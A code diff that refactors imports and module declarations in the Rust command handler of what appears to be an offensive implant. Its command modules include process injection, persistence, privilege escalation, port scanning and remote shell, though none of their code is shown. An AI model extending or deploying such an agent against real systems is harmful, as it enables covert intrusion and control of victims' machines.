@@ -1,34 +1,23 @@
-#[cfg(windows)] extern crate winapi;
-#[cfg(windows)] extern crate kernel32;
-#[cfg(windows)] extern crate winreg;
-#[cfg(windows)] use std::ptr;
-use serde_json::to_string as json_to_string;
+// Standard Library Imports
 use std::error::Error;
 use std::result::Result;
-use std::io::copy;
 use std::fmt;
-use std::path::Path;
-use std::fs::{write, File, copy as fs_copy};
-use std::env::{set_current_dir, current_dir, var, args};
-use std::process::Command;
-use reqwest::{Client};
-
+// Local imports
 use crate::config::ConfigOptions;
-
-
-pub mod cd;
-pub mod download;
-pub mod getprivs;
-pub mod inject;
-pub mod persist;
-pub mod portscan;
-pub mod ps;
-pub mod pwd;
-pub mod runas;
-pub mod save;
-pub mod shell;
-pub mod shutdown;
-pub mod unknown;
+// Command modules
+mod cd;
+mod download;
+mod getprivs;
+mod inject;
+mod persist;
+mod portscan;
+mod ps;
+mod pwd;
+mod runas;
+mod save;
+mod shell;
+mod shutdown;
+mod unknown;
 
 pub enum CommandType {
     Cd(String),
@@ -56,11 +45,6 @@ impl fmt::Display for CommandError {
 }
 
 impl Error for CommandError {}
-
-/// Handler for a NotionCommand
-// pub trait CommandHandler {
-//     fn handle(s: S)
-// }
 
 pub struct NotionCommand {
     pub command_type: CommandType,
